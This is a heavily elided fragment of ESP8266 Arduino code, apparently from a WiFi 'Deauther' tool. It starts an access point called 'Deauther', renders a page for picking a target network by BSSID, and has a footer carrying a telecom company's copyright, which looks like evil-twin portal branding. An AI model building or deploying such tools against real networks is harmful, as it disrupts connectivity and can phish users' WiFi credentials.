...
String footer() {
  return "</div><div class=q><a>&#169; 2024 PT Telkom Indonesia (Persero) Tbk.</a></div>";
}
...
void setup() {
  ...
  WiFi.softAP("Deauther", "Deauther320");
  ...
  if (hotspot_active == false) {
    ...
    for (int i = 0; i < 16; ++i) {
      ...
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #b90505;'>Selected</button></form></td></tr>";
      } else {
